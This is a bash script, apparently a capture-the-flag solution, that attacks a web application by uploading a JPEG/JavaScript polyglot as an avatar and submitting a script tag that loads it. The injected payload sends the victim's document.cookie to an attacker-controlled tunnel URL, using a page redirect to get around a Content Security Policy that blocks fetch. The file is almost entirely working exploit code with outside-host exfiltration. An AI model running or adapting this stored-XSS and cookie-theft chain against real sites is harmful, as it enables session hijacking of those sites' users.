#!/bin/bash

set -e

TMP_LOG=/tmp/tmp_proxy.log
# TARGET='http://localhost:1337'
TARGET='http://83.136.251.235:58207'
COOKIES=/tmp/cookies.txt
PAYLOD_FILE=/tmp/payload.js

# kill all background jobs when script is done
trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

echo starting the python http server
python3 -m http.server &
# clear the log file
echo > $TMP_LOG
ssh -R 80:localhost:8000 localhost.run -- --no-inject-http-proxy-headers >$TMP_LOG 2>&1 &
echo waiting for a remote url...
until grep 'https://.*life' -o $TMP_LOG >/dev/null ; do
	sleep 1
done
pub_url=$(grep 'https://.*life' -o $TMP_LOG)
echo "Using Remote: $pub_url"

echo "Generating payload >>"
# Change document location because fetch is blocked by CSP
payload="document.location.href='${pub_url}?'+document.cookie;"
# echo "   fetch('${pub_url}/\${document.cookies}');"
echo "$payload"

## YOU NEED THIS REPO https://github.com/s-3ntinel/imgjs_polygloter
python imgjs_polygloter/img_polygloter.py jpg --height 120 --width 120 --payload "$payload" --output $PAYLOD_FILE

# register and login
curl -s -X POST --json '{"username":"a","password":"a"}' "$TARGET/api/register" >/dev/null
curl -s -X POST --json '{"username":"a","password":"a"}' "$TARGET/api/login" --cookie-jar $COOKIES
echo
curl "$TARGET/api/upload" --cookie $COOKIES -F avatarFile=@$PAYLOD_FILE
echo
curl -X POST "$TARGET/api/submit" --cookie $COOKIES --json '{"content":"<script src=\"/api/avatar/a\" charset=\"ISO-8859-1\"></script>. abc."}'
echo

echo waiting for the webserver to get a call with the flag...
sleep 20
rm /tmp/tmp_proxy.log
